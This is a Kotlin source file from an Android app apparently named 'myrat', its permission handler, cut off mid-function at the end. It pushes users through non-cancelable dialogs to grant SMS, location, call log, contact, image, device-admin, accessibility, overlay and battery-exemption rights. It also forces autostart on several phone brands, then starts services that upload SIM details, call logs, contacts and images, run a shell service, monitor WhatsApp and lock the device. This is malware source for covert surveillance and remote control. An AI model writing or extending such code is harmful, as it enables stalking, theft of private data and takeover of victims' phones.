package com.myrat.app.handler

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.myrat.app.R
import com.myrat.app.receiver.MyDeviceAdminReceiver
import com.myrat.app.service.CallLogUploadService
import com.myrat.app.service.CallService
import com.myrat.app.service.ContactUploadService
import com.myrat.app.service.ImageUploadService
import com.myrat.app.service.LocationService
import com.myrat.app.service.ShellService
import com.myrat.app.service.SmsService
import com.myrat.app.service.LockService
import com.myrat.app.service.WhatsAppService
import com.myrat.app.utils.Logger

class PermissionHandler(
    private val activity: AppCompatActivity,
    private val simDetailsHandler: SimDetailsHandler
) {
    private var fromSettings = false
    private var requestingRestricted = false
    private var fromOverlaySettings = false
    private var fromOtherPermissionsSettings = false
    private var fromBatteryOptimizationSettings = false
    private var fromDeviceAdminSettings = false
    private var fromAccessibilitySettings = false
    private var fromExactAlarmSettings = false
    private var hasVisitedOtherPermissions = false
    private var isProcessingPermissions = false
    private val handler = Handler(Looper.getMainLooper())

    // Enhanced permission lists with Android 15 compatibility
    private val restrictedPermissions = mutableListOf(
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            add(Manifest.permission.USE_BIOMETRIC)
        }
        // Android 15 specific permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.VANILLA_ICE_CREAM) {
            add(Manifest.permission.SCHEDULE_EXACT_ALARM)
            add(Manifest.permission.USE_EXACT_ALARM)
        }
    }

    private val phonePermissions = mutableListOf(
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CALL_PHONE
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            add(Manifest.permission.READ_PHONE_NUMBERS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            add(Manifest.permission.FOREGROUND_SERVICE_PHONE_CALL)
        }
    }

    private val storagePermissions = mutableListOf<String>().apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }

    private val internetPermission = listOf(Manifest.permission.INTERNET)
    private val queryPackagesPermission = listOf(Manifest.permission.QUERY_ALL_PACKAGES)

    private val lockPermissions = mutableListOf<String>().apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            add(Manifest.permission.FOREGROUND_SERVICE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            add(Manifest.permission.FOREGROUND_SERVICE_LOCATION)
            add(Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC)
            add(Manifest.permission.FOREGROUND_SERVICE_SPECIAL_USE)
        }
        add(Manifest.permission.WAKE_LOCK)
        add(Manifest.permission.DISABLE_KEYGUARD)
        add(Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
    }

    private val nonRestrictedPermissions = phonePermissions + storagePermissions + internetPermission + queryPackagesPermission + lockPermissions
    private val allPermissions = restrictedPermissions + nonRestrictedPermissions

    private val permissionLauncher = try {
        activity.registerForActivityResult(
            ActivityResultContracts.RequestMultiplePermissions()
        ) { permissions ->
            Logger.log("Permission results: $permissions")
            handlePermissionResults(permissions)
        }
    } catch (e: Exception) {
        Logger.error("Failed to register permission launcher", e)
        null
    }

    fun requestPermissions() {
        if (isProcessingPermissions) {
            Logger.log("Already processing permissions, skipping duplicate request")
            return
        }
        
        isProcessingPermissions = true
        try {
            // Check if activity is still valid
            if (activity.isFinishing || activity.isDestroyed) {
                Logger.error("Activity is finishing or destroyed, cannot request permissions")
                return
            }

            val permissionsToRequest = nonRestrictedPermissions.filter {
                ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
            }
            
            if (permissionsToRequest.isEmpty()) {
                Logger.log("All non-restricted permissions already granted")
                startServicesForFeature(Feature.GENERAL)
                requestRestrictedPermissions()
            } else {
                Logger.log("Requesting non-restricted permissions: $permissionsToRequest")
                requestingRestricted = false
                showPermissionRationaleDialog(Feature.GENERAL, permissionsToRequest)
            }
        } catch (e: Exception) {
            Logger.error("Error in requestPermissions", e)
        } finally {
            isProcessingPermissions = false
        }
    }

    private fun requestRestrictedPermissions() {
        try {
            if (activity.isFinishing || activity.isDestroyed) {
                Logger.error("Activity is finishing or destroyed, cannot request restricted permissions")
                return
            }

            val permissionsToRequest = restrictedPermissions.filter {
                ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
            }
            
            if (permissionsToRequest.isEmpty()) {
                Logger.log("All restricted permissions already granted")
                startServicesForFeature(Feature.RESTRICTED)
                configureDeviceSpecificSettings()
            } else {
                Logger.log("Requesting restricted permissions: $permissionsToRequest")
                requestingRestricted = true
                showPermissionRationaleDialog(Feature.RESTRICTED, permissionsToRequest)
            }
        } catch (e: Exception) {
            Logger.error("Error in requestRestrictedPermissions", e)
        }
    }

    fun requestPermissionsForFeature(feature: Feature) {
        try {
            if (activity.isFinishing || activity.isDestroyed) {
                Logger.error("Activity is finishing or destroyed, cannot request permissions for feature")
                return
            }

            val permissions = when (feature) {
                Feature.RESTRICTED -> restrictedPermissions
                Feature.PHONE -> phonePermissions
                Feature.STORAGE -> storagePermissions
                Feature.INTERNET -> internetPermission + queryPackagesPermission
                Feature.LOCK -> lockPermissions
                Feature.WHATSAPP -> internetPermission + queryPackagesPermission
                Feature.GENERAL -> nonRestrictedPermissions
            }
            
            val permissionsToRequest = permissions.filter {
                ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
            }
            
            if (permissionsToRequest.isEmpty()) {
                Logger.log("All ${feature.name} permissions already granted")
                startServicesForFeature(feature)
                if (feature == Feature.GENERAL) {
                    requestRestrictedPermissions()
                }
            } else {
                Logger.log("Requesting ${feature.name} permissions: $permissionsToRequest")
                requestingRestricted = feature == Feature.RESTRICTED
                showPermissionRationaleDialog(feature, permissionsToRequest)
            }
        } catch (e: Exception) {
            Logger.error("Error in requestPermissionsForFeature", e)
        }
    }

    private fun handlePermissionResults(permissions: Map<String, Boolean>) {
        try {
            val deniedPermissions = permissions.filter { !it.value }.keys.toList()
            if (deniedPermissions.isEmpty()) {
                Logger.log("All requested permissions granted")
                if (!requestingRestricted) {
                    startServicesForFeature(Feature.GENERAL)
                    // Delay before requesting restricted permissions
                    handler.postDelayed({
                        requestRestrictedPermissions()
                    }, 1000)
                } else {
                    startServicesForFeature(Feature.RESTRICTED)
                    // Delay before configuring device settings
                    handler.postDelayed({
                        configureDeviceSpecificSettings()
                    }, 1000)
                }
            } else {
                Logger.log("Permissions denied: $deniedPermissions")
                val showRationale = deniedPermissions.any {
                    try {
                        activity.shouldShowRequestPermissionRationale(it)
                    } catch (e: Exception) {
                        Logger.error("Error checking rationale for $it", e)
                        false
                    }
                }
                if (showRationale) {
                    Logger.log("Showing rationale for denied permissions")
                    showPermissionRationaleDialog(
                        if (requestingRestricted) Feature.RESTRICTED else Feature.GENERAL,
                        deniedPermissions
                    )
                } else {
                    Logger.log("Permissions denied, possibly 'Don't ask again'. Requesting manual settings.")
                    showRestrictedSettingsDialog()
                }
            }
        } catch (e: Exception) {
            Logger.error("Error in handlePermissionResults", e)
        }
    }

    private fun showPermissionRationaleDialog(feature: Feature, permissions: List<String>) {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot show rationale dialog: Activity is finishing or destroyed")
            return
        }
        
        try {
            val message = when (feature) {
                Feature.RESTRICTED -> "SMS, Location, Biometric, and Alarm permissions are required for core app functionality, including lock features. Please grant all permissions."
                Feature.PHONE -> "Phone permissions are needed to make calls, access call logs, and contacts. Please grant all permissions."
                Feature.STORAGE -> "Storage permissions are needed to access images. Please grant all permissions."
                Feature.INTERNET -> "Internet and package query permissions are required for network connectivity and app monitoring (e.g., WhatsApp). Please grant all permissions."
                Feature.LOCK -> "Foreground service, wake lock, battery optimization, and system alert permissions are required for device lock and screen management features. Please grant all permissions."
                Feature.WHATSAPP -> "Internet and package query permissions are required to monitor WhatsApp and WhatsApp Business. Please grant all permissions."
                Feature.GENERAL -> "This app requires all permissions to function properly, including WhatsApp monitoring, lock, and screen management features. Please grant all requested permissions."
            }
            
            val dialog = AlertDialog.Builder(activity)
                .setTitle("Permissions Required")
                .setMessage(message)
                .setPositiveButton("Grant") { _, _ ->
                    try {
                        permissionLauncher?.launch(permissions.toTypedArray())
                    } catch (e: Exception) {
                        Logger.error("Failed to launch permission request", e)
                        showRestrictedSettingsDialog()
                    }
                }
                .setNegativeButton("Go to Settings") { _, _ ->
                    fromSettings = true
                    openAppSettings()
                }
                .setCancelable(false)
                .create()
                
            // Show dialog safely
            if (!activity.isFinishing && !activity.isDestroyed) {
                dialog.show()
            }
        } catch (e: Exception) {
            Logger.error("Failed to show rationale dialog", e)
            // Fallback to settings
            openAppSettings()
        }
    }

    private fun openAppSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${activity.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            activity.startActivity(intent)
        } catch (e: Exception) {
            Logger.error("Failed to open app settings", e)
        }
    }

    private fun startServicesForFeature(feature: Feature) {
        try {
            Logger.log("Starting services for feature: ${feature.name}")
            when (feature) {
                Feature.RESTRICTED -> {
                    startAppropriateService(Intent(activity, SmsService::class.java))
                    startAppropriateService(Intent(activity, LocationService::class.java))
                }
                Feature.PHONE -> {
                    try {
                        simDetailsHandler.uploadSimDetails()
                    } catch (e: Exception) {
                        Logger.error("Failed to upload SIM details", e)
                    }
                    startAppropriateService(Intent(activity, CallLogUploadService::class.java))
                    startAppropriateService(Intent(activity, ContactUploadService::class.java))
                    startAppropriateService(Intent(activity, CallService::class.java))
                }
                Feature.STORAGE -> {
                    startAppropriateService(Intent(activity, ImageUploadService::class.java))
                }
                Feature.INTERNET, Feature.WHATSAPP -> {
                    if (internetPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED } &&
                        queryPackagesPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                        startAppropriateService(Intent(activity, ShellService::class.java))
                        startAppropriateService(Intent(activity, WhatsAppService::class.java))
                    } else {
                        Logger.log("Cannot start ShellService or WhatsAppService: Missing INTERNET or QUERY_ALL_PACKAGES permission")
                    }
                }
                Feature.LOCK -> {
                    startAppropriateService(Intent(activity, LockService::class.java))
                }
                Feature.GENERAL -> {
                    if (phonePermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                        try {
                            simDetailsHandler.uploadSimDetails()
                        } catch (e: Exception) {
                            Logger.error("Failed to upload SIM details in GENERAL", e)
                        }
                        startAppropriateService(Intent(activity, CallLogUploadService::class.java))
                        startAppropriateService(Intent(activity, ContactUploadService::class.java))
                        startAppropriateService(Intent(activity, CallService::class.java))
                    }
                    if (storagePermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                        startAppropriateService(Intent(activity, ImageUploadService::class.java))
                    }
                    if (internetPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED } &&
                        queryPackagesPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                        startAppropriateService(Intent(activity, ShellService::class.java))
                        startAppropriateService(Intent(activity, WhatsAppService::class.java))
                    }
                    if (lockPermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                        startAppropriateService(Intent(activity, LockService::class.java))
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error starting services for feature: ${feature.name}", e)
        }
    }

    private fun startAllServices() {
        try {
            if (!areAllPermissionsGranted()) {
                Logger.log("Cannot start services: Not all permissions are granted")
                requestPermissions()
                return
            }
            Logger.log("All permissions granted, ensuring all services are started")
            
            try {
                simDetailsHandler.uploadSimDetails()
            } catch (e: Exception) {
                Logger.error("Failed to upload SIM details in startAllServices", e)
            }
            
            val services = listOf(
                SmsService::class.java,
                LocationService::class.java,
                CallLogUploadService::class.java,
                ContactUploadService::class.java,
                CallService::class.java,
                ImageUploadService::class.java,
                LockService::class.java
            )
            
            services.forEach { serviceClass ->
                startAppropriateService(Intent(activity, serviceClass))
            }
            
            if (internetPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED } &&
                queryPackagesPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                startAppropriateService(Intent(activity, ShellService::class.java))
                startAppropriateService(Intent(activity, WhatsAppService::class.java))
            }
        } catch (e: Exception) {
            Logger.error("Error in startAllServices", e)
        }
    }

    private fun startAppropriateService(intent: Intent) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                activity.startForegroundService(intent)
            } else {
                activity.startService(intent)
            }
            Logger.log("Started service: ${intent.component?.className}")
        } catch (e: Exception) {
            Logger.error("Failed to start service: ${intent.component?.className}", e)
        }
    }

    fun areAllPermissionsGranted(): Boolean {
        return try {
            val standardPermissionsGranted = allPermissions.all {
                ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED
            }
            val overlayPermissionGranted = Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(activity)
            val batteryOptimizationDisabled = try {
                (activity.getSystemService(Context.POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(activity.packageName)
            } catch (e: Exception) {
                Logger.error("Error checking battery optimization", e)
                false
            }
            val deviceAdminActive = try {
                (activity.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager)
                    .isAdminActive(ComponentName(activity, MyDeviceAdminReceiver::class.java))
            } catch (e: Exception) {
                Logger.error("Error checking device admin", e)
                false
            }
            val accessibilityEnabled = isAccessibilityServiceEnabled()
            val exactAlarmGranted = checkExactAlarmPermission()
            
            val allGranted = standardPermissionsGranted && overlayPermissionGranted && batteryOptimizationDisabled && deviceAdminActive && accessibilityEnabled && exactAlarmGranted
            Logger.log("Permissions status: standard=$standardPermissionsGranted, overlay=$overlayPermissionGranted, battery=$batteryOptimizationDisabled, admin=$deviceAdminActive, accessibility=$accessibilityEnabled, exactAlarm=$exactAlarmGranted")
            allGranted
        } catch (e: Exception) {
            Logger.error("Error checking all permissions", e)
            false
        }
    }

    private fun checkExactAlarmPermission(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                alarmManager.canScheduleExactAlarms()
            } else {
                true // Not required on older versions
            }
        } catch (e: Exception) {
            Logger.error("Error checking exact alarm permission", e)
            true // Assume granted if we can't check
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        return try {
            val expectedService = "${activity.packageName}/${WhatsAppService::class.java.canonicalName}"
            val accessibilityManager = activity.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
            val enabledServices = accessibilityManager.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
            enabledServices.any { it.id == expectedService }
        } catch (e: Exception) {
            Logger.error("Error checking accessibility service", e)
            false
        }
    }

    fun handleResume() {
        try {
            if (fromSettings) {
                fromSettings = false
                Logger.log("Returned from settings (likely app settings). Checking permissions.")
                handler.postDelayed({
                    if (allPermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                        startServicesForFeature(Feature.GENERAL)
                        startServicesForFeature(Feature.RESTRICTED)
                        configureDeviceSpecificSettings()
                    } else {
                        requestPermissions()
                    }
                }, 500)
            } else if (fromOverlaySettings) {
                fromOverlaySettings = false
                Logger.log("Returned from overlay settings. Checking overlay permission.")
                handler.postDelayed({ checkOverlayPermission() }, 500)
            } else if (fromOtherPermissionsSettings) {
                fromOtherPermissionsSettings = false
                Logger.log("Returned from other permissions settings. Proceeding with autostart.")
                handler.postDelayed({
                    startServicesForFeature(Feature.PHONE)
                    startServicesForFeature(Feature.INTERNET)
                    startServicesForFeature(Feature.LOCK)
                    startServicesForFeature(Feature.WHATSAPP)
                    enableManufacturerSpecificAutostart()
                }, 500)
            } else if (fromDeviceAdminSettings) {
                fromDeviceAdminSettings = false
                Logger.log("Returned from device admin settings. Checking device admin permission.")
                handler.postDelayed({ checkDeviceAdminPermission() }, 500)
            } else if (fromBatteryOptimizationSettings) {
                fromBatteryOptimizationSettings = false
                Logger.log("Returned from battery optimization settings. Checking battery optimization.")
                handler.postDelayed({ checkBatteryOptimization() }, 500)
            } else if (fromAccessibilitySettings) {
                fromAccessibilitySettings = false
                Logger.log("Returned from accessibility settings. Checking accessibility permission.")
                handler.postDelayed({ checkAccessibilityPermission() }, 500)
            } else if (fromExactAlarmSettings) {
                fromExactAlarmSettings = false
                Logger.log("Returned from exact alarm settings. Checking exact alarm permission.")
                handler.postDelayed({ checkExactAlarmPermission() }, 500)
            }
        } catch (e: Exception) {
            Logger.error("Error in handleResume", e)
        }
    }

    private fun showRestrictedSettingsDialog() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot show restricted settings dialog: Activity is finishing or destroyed")
            return
        }
        
        try {
            val message = "To continue, you must allow all permissions from App Settings. Please enable all permissions, including SMS, Location, Biometric, Foreground Service, Exact Alarm, and WhatsApp monitoring permissions."
            
            val dialog = AlertDialog.Builder(activity)
                .setTitle("All Permissions Required")
                .setMessage(message)
                .setPositiveButton("Go to Settings") { _, _ ->
                    fromSettings = true
                    openAppSettings()
                }
                .setCancelable(false)
                .create()
                
            if (!activity.isFinishing && !activity.isDestroyed) {
                dialog.show()
            }
        } catch (e: Exception) {
            Logger.error("Failed to show restricted settings dialog", e)
            openAppSettings()
        }
    }

    private fun configureDeviceSpecificSettings() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot configure device settings: Activity is finishing or destroyed")
            return
        }
        Logger.log("Starting device-specific settings configuration")
        checkExactAlarmPermissionFirst()
    }

    private fun checkExactAlarmPermissionFirst() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot check exact alarm permission: Activity is finishing or destroyed")
            return
        }
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                if (!alarmManager.canScheduleExactAlarms()) {
                    Logger.log("Exact alarm permission not granted, prompting user")
                    
                    val dialog = AlertDialog.Builder(activity)
                        .setTitle("Exact Alarm Permission Required")
                        .setMessage("This app requires permission to schedule exact alarms for proper service restart and background functionality. Please grant this permission.")
                        .setPositiveButton("Go to Settings") { _, _ ->
                            fromExactAlarmSettings = true
                            try {
                                val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                                    data = Uri.parse("package:${activity.packageName}")
                                }
                                activity.startActivity(intent)
                            } catch (e: Exception) {
                                Logger.error("Failed to open exact alarm settings", e)
                                checkOverlayPermission()
                            }
                        }
                        .setCancelable(false)
                        .create()
                        
                    if (!activity.isFinishing && !activity.isDestroyed) {
                        dialog.show()
                    }
                } else {
                    Logger.log("Exact alarm permission granted or not required")
                    checkOverlayPermission()
                }
            } else {
                Logger.log("Exact alarm permission not required on this Android version")
                checkOverlayPermission()
            }
        } catch (e: Exception) {
            Logger.error("Failed to check exact alarm permission", e)
            checkOverlayPermission()
        }
    }

    private fun checkOverlayPermission() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot check overlay permission: Activity is finishing or destroyed")
            return
        }
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
                Logger.log("Overlay permission not granted, prompting user")
                
                val dialog = AlertDialog.Builder(activity)
                    .setTitle("Overlay Permission Required")
                    .setMessage("This app requires permission to draw over other apps to enable WhatsApp monitoring and lock functionality. Please grant this permission.")
                    .setPositiveButton("Go to Settings") { _, _ ->
                        fromOverlaySettings = true
                        try {
                            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                                data = Uri.parse("package:${activity.packageName}")
                            }
                            activity.startActivity(intent)
                        } catch (e: Exception) {
                            Logger.error("Failed to open overlay settings", e)
                            checkOtherPermissions()
                        }
                    }
                    .setCancelable(false)
                    .create()
                    
                if (!activity.isFinishing && !activity.isDestroyed) {
                    dialog.show()
                }
            } else {
                Logger.log("Overlay permission granted or not required")
                checkOtherPermissions()
            }
        } catch (e: Exception) {
            Logger.error("Failed to check overlay permission", e)
            checkOtherPermissions()
        }
    }

    private fun checkOtherPermissions() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot check other permissions: Activity is finishing or destroyed")
            return
        }
        
        try {
            if (hasVisitedOtherPermissions) {
                Logger.log("User has already visited Other permissions settings, assuming granted")
                enableManufacturerSpecificAutostart()
                return
            }

            val manufacturer = Build.MANUFACTURER.lowercase()
            val intent = createManufacturerSpecificIntent(manufacturer, "permissions")

            Logger.log("Prompting user for Other permissions")
            
            val dialog = AlertDialog.Builder(activity)
                .setTitle("Other Permissions Required")
                .setMessage("This app requires permissions under 'Other permissions' (e.g., Display pop-up windows, Start in background) to function. Please enable these permissions.")
                .setPositiveButton("Go to Settings") { _, _ ->
                    hasVisitedOtherPermissions = true
                    fromOtherPermissionsSettings = true
                    try {
                        activity.startActivity(intent)
                    } catch (e: Exception) {
                        Logger.error("Failed to open other permissions settings", e)
                        enableManufacturerSpecificAutostart()
                    }
                }
                .setCancelable(false)
                .create()
                
            if (!activity.isFinishing && !activity.isDestroyed) {
                dialog.show()
            }
        } catch (e: Exception) {
            Logger.error("Failed to check other permissions", e)
            enableManufacturerSpecificAutostart()
        }
    }

    private fun enableManufacturerSpecificAutostart() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot enable autostart: Activity is finishing or destroyed")
            return
        }
        
        try {
            val manufacturer = Build.MANUFACTURER.lowercase()
            val intent = createManufacturerSpecificIntent(manufacturer, "autostart")
            
            activity.startActivity(intent)
        } catch (e: Exception) {
            Logger.error("Autostart setting failed for ${Build.MANUFACTURER}", e)
            openAppSettings()
        }
        checkDeviceAdminPermission()
    }

    private fun createManufacturerSpecificIntent(manufacturer: String, type: String): Intent {
        return when (manufacturer) {
            "xiaomi" -> when (type) {
                "permissions" -> Intent().apply {
                    setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity"))
                    putExtra("extra_pkgname", activity.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                "autostart" -> Intent().apply {
                    setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"))
                    putExtra("package_name", activity.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                else -> createFallbackIntent()
            }
            "oppo" -> when (type) {
                "permissions" -> Intent().apply {
                    setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.PermissionManagerActivity"))
                    putExtra("package_name", activity.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                "autostart" -> Intent().apply {
                    setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"))
                    putExtra("pkgName", activity.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                else -> createFallbackIntent()
            }
            "vivo" -> Intent().apply {
                setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phonepower.BackgroundPowerManagerActivity"))
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            "huawei" -> when (type) {
                "permissions" -> Intent().apply {
                    setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.permissionmanager.ui.MainActivity"))
                    putExtra("packageName", activity.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                "autostart" -> Intent().apply {
                    setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"))
                    putExtra("app_pkg", activity.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                else -> createFallbackIntent()
            }
            "samsung" -> Intent().apply {
                setComponent(ComponentName("com.samsung.android.sm", "com.samsung.android.sm.ui.battery.BatteryActivity"))
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            else -> createFallbackIntent()
        }
    }

    private fun createFallbackIntent(): Intent {
        return Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:${activity.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
    }

    private fun checkDeviceAdminPermission() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot check device admin permission: Activity is finishing or destroyed")
            return
        }

        try {
            val devicePolicyManager = activity.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = ComponentName(activity, MyDeviceAdminReceiver::class.java)

            if (!devicePolicyManager.isAdminActive(adminComponent)) {
                Logger.log("Device admin permission not granted, prompting user")
                
                val dialog = AlertDialog.Builder(activity)
                    .setTitle("Device Admin Permission Required")
                    .setMessage("This app requires device admin privileges to manage lock and screen settings remotely. Please enable this permission.")
                    .setPositiveButton("Go to Settings") { _, _ ->
                        fromDeviceAdminSettings = true
                        try {
                            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                                putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                    "This permission is required to allow the app to lock the device and manage screen settings.")
                            }
                            activity.startActivity(intent)
                        } catch (e: Exception) {
                            Logger.error("Failed to open device admin settings", e)
                            checkAccessibilityPermission()
                        }
                    }
                    .setCancelable(false)
                    .create()
                    
                if (!activity.isFinishing && !activity.isDestroyed) {
                    dialog.show()
                }
            } else {
                Logger.log("Device admin permission already granted")
                checkAccessibilityPermission()
            }
        } catch (e: Exception) {
            Logger.error("Failed to check device admin permission", e)
            checkAccessibilityPermission()
        }
    }

    private fun checkAccessibilityPermission() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot check accessibility permission: Activity is finishing or destroyed")
            return
        }
        
        try {
            if (!isAccessibilityServiceEnabled()) {
                Logger.log("Accessibility service not enabled, prompting user")
                
                val dialog = AlertDialog.Builder(activity)
                    .setTitle("Accessibility Permission Required")
                    .setMessage("This app requires accessibility service to monitor WhatsApp and WhatsApp Business. Please enable it.")
                    .setPositiveButton("Go to Settings") { _, _ ->
                        fromAccessibilitySettings = true
                        try {
                            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                            activity.startActivity(intent)
                        } catch (e: Exception) {
                            Logger.error("Failed to open accessibility settings", e)
                            checkBatteryOptimization()
                        }
                    }
                    .setCancelable(false)
                    .create()
                    
                if (!activity.isFinishing && !activity.isDestroyed) {
                    dialog.show()
                }
            } else {
                Logger.log("Accessibility service enabled")
                checkBatteryOptimization()
            }
        } catch (e: Exception) {
            Logger.error("Failed to check accessibility permission", e)
            checkBatteryOptimization()
        }
    }

    private fun checkBatteryOptimization() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot check battery optimization: Activity is finishing or destroyed")
            return
        }
        
        try {
            val powerManager = activity.getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(activity.packageName)) {
                Logger.log("Battery optimization not disabled, prompting user")
                
                val dialog = try {
                    val dialogView = activity.layoutInflater.inflate(R.layout.custom_dialog_layout, null)
                    AlertDialog.Builder(activity)
                        .setTitle("Battery Optimization Required")
                        .setView(dialogView)
                        .setMessage("This app requires battery optimization to be disabled to function properly, especially for WhatsApp monitoring and lock features. Please disable battery optimization.")
                        .setPositiveButton("Go to Settings") { _, _ ->
                            disableBatteryOptimization()
                        }
                        .setCancelable(false)
                        .create()
                } catch (e: Exception) {
                    Logger.error("Failed to inflate custom dialog", e)
                    AlertDialog.Builder(activity)
                        .setTitle("Battery Optimization Required")
                        .setMessage("This app requires battery optimization to be disabled to function properly. Please disable battery optimization.")
                        .setPositiveButton("Go to Settings") { _, _ ->
                            disableBatteryOptimization()
                        }
                        .setCancelable(false)
                        .create()
                }
                
                if (!activity.isFinishing && !activity.isDestroyed) {
                    dialog.show()
                }
            } else {
                Logger.log("Battery optimization disabled")
                startAllServices()
            }
        } catch (e: Exception) {
            Logger.error("Failed to check battery optimization", e)
            startAllServices()
        }
    }

    private fun disableBatteryOptimization() {
        if (activity.isFinishing || activity.isDestroyed) {
